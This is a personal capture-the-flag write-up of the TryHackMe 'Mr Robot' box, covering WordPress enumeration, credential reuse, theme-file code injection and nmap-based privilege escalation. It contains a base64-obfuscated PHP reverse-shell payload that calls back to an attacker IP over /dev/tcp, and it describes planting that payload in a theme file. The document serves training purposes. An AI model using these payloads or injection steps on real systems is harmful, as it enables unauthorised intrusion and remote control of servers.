
Hi everyone, It has been a long time especially for me ,but I was really busy with my profession. Today I would like to analyze the machine called `Mr robot` from TryHackMe. 


```
nano /etc/hosts

# example to add your domain
0.0.0.0 robot.thm
```

![[Mrrobot/images/7.png]]

Observe the above screenshot, this is how it should look like
## Reconnaissance

Straightforwardly, go with the `dirsearch`

`dirsearch -u http://robot.thm`

I decided to visit only HTTP status code 200 returned endpoints because redirected paths could not find any solutions as an unauthenticated user.

![[Mrrobot/images/8.png]]

![[Mrrobot/images/9.png]]

![[Mrrobot/images/10.png]]

All in all, `robots.txt`, `license.txt` paths consisting juicy information about first flag. Let's check my findings:


![[Mrrobot/images/11.png]]
`robots` file indicating two seperated endpoints which are `fsocity.dic` (dictionary extension) and `key-1-of-3.txt`.

![[Mrrobot/images/12.png]]

Due to the naming, I assumed that this was the flag1.

![[Mrrobot/images/13.png]]

Gotcha :)

The other endpoint including dictionary combolist, I automatically thought whether I can bruteforce the Wordpress panel or not. Anyway, let me move on other endpoints  consecutievly. (`readme`, `intro`,  `license`)

`intro` endpoint was generic Mr robot film part:

![[Mrrobot/images/14.png]]

The creator of the machine was baiting me :)

![[Mrrobot/images/15.png]]

The last one was really interesting:

![[Mrrobot/images/16.png]]

Let's check the source code:

There was a `base64` encoded key. Therefore, I preferred to use `Cyberchef` since it could handle it.

![[Mrrobot/images/17.png]]

Yesss ! ! !

What if I use it on both `SSH` or `Wordpress` ? 

First of all, I conducted `nmap` scan whether `SSH` was opened or not.

`sudo nmap -sV -sC -p- robot.thm`

I deliberately used `-p-` parameter because sometimes the machine creators hide `SSH` on different ports. Besides, you may see a couple of instances working on different than port `22` in real-world engagements.

![[Mrrobot/images/18.png]]

`Wordpress` application may work with us :)

Move on `http://robot.thm/wp-login.php`:

![[Mrrobot/images/19.png]]

Do not forget to make `Elliot` as `elliot`. I was wrong in my first attempt.

In most of the `Wordpress` applications, we mostly see plugin, theme based templated mostly working on `PHP` architecture. Let me dive into `wpscan` highly beneficial tool to enumerate  `Wordpress` + capturing credentials of the live application. You can both conduct bruteforce attempt to the `wp-login` panel and fuzz the application directly. Furthermore, It can reveals anything appeals to vulnerable.

![[Mrrobot/images/20.png]]

`wpscan` requires combolist to enumerate user. However, in my application, there would not be any bruteforce attempt ,so I manually created a .txt file to embed username and password.

```
echo "ER28-0652" > passwords.txt
```

`wpscan --url http://robot.thm --usernames elliot --passwords passwords.txt`

it implies that a plugin named `twentyfifteen` was outdated.

![[Mrrobot/images/21.png]]

What's more, it bruteforced only single list with user:pass combination.

![[Mrrobot/images/22.png]]

In my recent check, there were a lot of `php` programs embedded in this application. That's why, we can say `100` percentage to the app working on `PHP` as a backend. Let's find a hole to run `PHP` programs.

Initially, I directly move on `theme` plugin called `twentyfifteen`:

![[Mrrobot/images/23.png]]

It has been running for almost 10 minutes as it is :) Let me move on editor to modify manually:

## Exploitation

Now we have a lot of `PHP` programs embedded in current theme. `Generic Pentest Monkey` payload would work ,yet I would like you to show a tool named `penelope`, automates all the shell upgrade processes handling all the stuff related to the persistence rapidly.

![[Mrrobot/images/24.png]]

[Github Repo](https://github.com/brightio/penelope)

Before you try to run the tool, you should add it on your `env` variable ,but tool also manages automatically. Just call it with `penelope` in your terminal.

1) it directly deploys the listener on all your interface check it below:

![[Mrrobot/images/25.png]]

If you give `p` as input, It recommends payload options adapting your interface:

![[Mrrobot/images/26.png]]
The first payload was directly attempting to run bash reverse shell ,but still we can use with compatible version of it. Thanks to the `shell_exec()` and `exec()` methods in `PHP`, we can handle all this concerns.

```
<?php
shell_exec("echo -n c2V0c2lkIGJhc2ggPiYgL2Rldi90Y3AvMTAuMTQuOTIuMTg5LzQ0NDQgMD4mMSAm | base64 -d | bash");
?>
```

or

```
<?php
exec("echo -n c2V0c2lkIGJhc2ggPiYgL2Rldi90Y3AvMTAuMTQuOTIuMTg5LzQ0NDQgMD4mMSAm | base64 -d | bash");
?>
```

Replace entire comment generated by `Wordpress` with our base64 payload:

![[Mrrobot/images/27.png]]

Move the endpoint consisting `comments.php`.

**Notice:** `shell_exec()` method did not work because method was not activated.

![[Mrrobot/images/28.png]]

From the above image, as you can see it attempted and successfully achieved fully interactive `TTY` and `rlwrap` (memorizing shell utility) together. 

Let's move in the  target host:

Capture the second flag:

![[Mrrobot/images/29.png]]

Since I got the shell with `web applicaton` not through known user:pass via `SSH`. I could not analyze which command `daemon` can run.

![[Mrrobot/images/30.png]]

I recognized that I was the `daemon` ,but still we have `robot` user:

![[Mrrobot/images/31.png]]

Apply `lateral movement` via user credentials.

Vertical privilege escalation succeed:

![[Mrrobot/images/32.png]]


Let's authenticate as `robot`:

```
su robot
```

![[Mrrobot/images/33.png]]

After a couple of minutes, I preferred `OS discovery` via `linpeas`. Before I download the script, I want you warn you about `linpeas`. Generic `linpeas` was not located on static page known as `linpeas.sh` domain. It is directly on Carlos's profile:

[Original linpeas](https://github.com/peass-ng/PEASS-ng)

In my first attempt, I was not able to run script with `penelope` shell. Reason why I could not upload + run in one command is that I could not achieve it on `/home/robot` path, instead I applied on `/tmp/` folder as default then it worked. Maybe, because of the restrictions, I was not successfull.


deploy python http server:

`sudo python -m http.server 80`

![[Mrrobot/images/34.png]]

just download it from your local server:

`curl -L http://tun0_IP_address:80/linpeas.sh`

`chmod +x linpeas.sh` the run `./linpeas.sh`:

![[Mrrobot/images/35.png]]

Observe `nmap` binary seems like highly vulnerable vector:

![[Mrrobot/images/36.png]]

Let's abuse with [GFTOBINS](https://gtfobins.github.io/gtfobins/nmap/):

I used different techniques ,but `OS` restrictions did not allow me to work with `sudo` command by default:

I applied first one ,yet it started to run as `nmap`. However, I do not want to dive into `nmap` just to use it as privilege vector. Second one worked really well:

![[Mrrobot/images/37.png]]


![[Mrrobot/images/38.png]]
`/root/` path includes final flag.


May The Pentest Be With You ! ! !